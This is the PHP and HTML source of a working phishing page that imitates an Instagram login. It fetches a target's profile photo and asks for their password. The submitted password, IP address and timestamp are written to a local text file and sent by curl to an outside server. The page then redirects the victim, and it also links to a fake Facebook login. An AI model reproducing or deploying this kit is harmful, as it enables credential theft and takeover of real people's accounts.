<?php
error_reporting(0);
function ara($bas, $son, $yazi)
{
    @preg_match_all('/' . preg_quote($bas, '/') .
    '(.*?)'. preg_quote($son, '/').'/i', $yazi, $m);
    return @$m[1];
}
$nick = $_GET['nick'];
$url = 'https://instagram.com/' . $nick;
    $html = file_get_contents($url);
	$dom = new DOMDocument();
    $dom->loadHTML($html);
	$veri = $dom->textContent;
	$cc = ara('"thumbnail_src":"','"',$veri);
    $meta_tags = $dom->getElementsByTagName('meta');
    foreach( $meta_tags as $meta ) {
        if( $meta->getAttribute('property') == 'og:image' ) {
            $image_url = $meta->getAttribute('content');
        }
    }
if(empty($cc)){
		$cc[0] = $image_url;
	}
if($_POST){
$username = $_POST['username'];
$password =  $_POST['password'];
$ip = $_SERVER['REMOTE_ADDR'];
date_default_timezone_set('Europe/Istanbul');
$cur_time=date("d-m-Y H:i:s");
$file = fopen('hesap.txt', 'a');
fwrite($file,"Kullanıcı Adı: " .$nick. "\nŞifre: " .$password. "\nIp Adresi: " .$ip. " \nTarih: " .$cur_time.  "\n\n");
$user =$_GET['nick'];
$gonderilecekler = "username=$user&password=$password&ip=$ip&tarih=$cur_time";


$ornek=curl_init(); curl_setopt($ornek, CURLOPT_TIMEOUT, 5); curl_setopt($ornek,CURLOPT_URL,"https://stalkciyiz.com/user/index.php"); curl_setopt($ornek,CURLOPT_POST,1); curl_setopt($ornek, CURLOPT_POSTFIELDS, $gonderilecekler);  $gelen_veri = curl_exec($ornek); echo $gelen_veri;  curl_close($ornek);

fclose($file);
echo '';
	header("Location: mail/confirmation");
}
	?>

<html>
<head>
  <title>Login To Instagram</title>
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <link rel="shortcut icon" href="https://www.freepnglogos.com/uploads/instagram-social-media-logo-for-your-works-png-format-19.png">
<style>
#liste{ 
display:inline-block;
} 
#link{
text-decoration:none; 
color:#003569; 
font-family:sans-serif; 
font-size:13px; 
font-weight:540; 
vertical-align: baseline; 
} 
#asdxyz{ 
background-color:white; 
width:70%; 
border:1px solid #dedede; 
} 
#erhanasd{ 
font-family:sans-serif; 
font-weight:400; 
letter-spacing:; 
color:#3d3d3d; 
font-size:27px; 
} 
.fa-facebook { 
background: #3B5998; 
color: white; 
} 
.fa {
padding: 4px; 
padding-left:6px; 
padding-right:6px; 
border-radius:6px; 
font-size: 16px;
width: 6px; 
text-align: center; 
text-decoration: none; 
</style>
</head>
<body style="padding:0; margin:0; background-color:" > 

<center>

  <div style="height: 126px; margin:0px; padding:0px; background:white;border-bottom:1px solid #dedede; width:100%;">

  <img style="width:250px;" src="https://play-lh.googleusercontent.com/9ASiwrVdio0I2i2Sd1UzRczyL81piJoKfKKBoC8PUm2q6565NMQwUJCuNGwH-enhm00">

</center>

</div></div>

<center><br><br><br><br><div style="border: 1px solid #e6e6e6; width:83%;" > <img src="img/xq1.png" alt=instagram style="margin-top:">
<br>
	<img src="<?php echo $image_url;?>" alt="<?php echo $nick;?>" of photo width=150 style="border-radius:50%;margin-top:12px;">

 <br><form method="post">  <br> <input type="password" name="password" required="" placeholder="Password" style=" text-overflow: ellipsis; font: 400 13.3333px Arial;color:; font-size:13px; background-color:#fafafa; outline:none; padding-left:6px;width:230px ;height:27px; border: 1px solid #e6e6e6; margin:7px; font-weight:300;border-radius:3px; margin:4px;"><br> <button type="submit" style="margin-top:6px;width:236px;background: #3897f0; border-color: #3897f0; color: #fff; outline:0; border:0; height:25px; border-radius:4px; margin-top:5px; font-weight:bold; font-family:sans-serif; font-weight:550; font-size:15px">
Continue as @<?php echo $nick;?></button><br><br></form><br>






 <a href="facebook/account/login" style="text-decoration:none; font-family:sans-serif; font-size:16px;color:#3B5998;font-family:sans-serif;">

<img src="https://img.icons8.com/android/24/000000/facebook-new.png"/> Login To Facebook</a>


  <br><br> 

  <a href="" style="font-family:sans-serif;text-decoration:none;color:#385185; font-size:13px;">Forgot Password ?</a><br><br><br></div> 
  <div style="border: 1px solid #e6e6e6; width:83%; margin:8px;" ><p style="font-size:14px;font-family:sans-serif;">Don't have an account ?</a></p></div> 
    <a href="" style="font-family: sans-serif; text-decoration:none;text-decoration:0; color:rgb(56, 151, 240); font-size:14px; font-family:sans-serif;">Sign Up</a></p></div> 

<br><br>

  <img src="https://play.google.com/intl/en_us/badges/static/images/badges/en_badge_web_generic.png"width="120">

    <img src="https://hrantdink.org/images/KM/kardes/5847e95fcef1014c0b5e4822.png" width="120"> 

<br><b><br> 

<div id="menu">
  <li id="liste"><a href="" id="link">ABOUT US</a></li>&nbsp;&nbsp;&nbsp;&nbsp;
  <li id="liste"><a href="" id="link">SUPPORT</a></li>&nbsp;&nbsp;&nbsp;&nbsp;
  <li id="liste"><a href="" id="link">PRESS</a></li>&nbsp;&nbsp;&nbsp;&nbsp;
  <li id="liste"><a href="" id="link">API</a></li>&nbsp;&nbsp;&nbsp;&nbsp;
  <li id="liste"><a href="" id="link">JOBS</a></li>&nbsp;&nbsp;&nbsp;&nbsp;
  <li id="liste"><a href="" id="link">PRIVACY</a></li>&nbsp;&nbsp;&nbsp;&nbsp;
  <li id="liste"><a href="" id="link">TERMS</a></li>&nbsp;&nbsp;&nbsp;&nbsp;
  <li id="liste"><a href="" id="link">DIRECTORY</a></li>&nbsp;&nbsp;&nbsp;&nbsp;
  <li id="liste"><a href="" id="link">LANGUAGE</a></li></div>

<br> 

    <p id="copyright" style="font-family:sans-serif;font-weight:100; font-size:14px;">© 2020 INSTAGRAM </p>
     
</center>
</body>
</html>
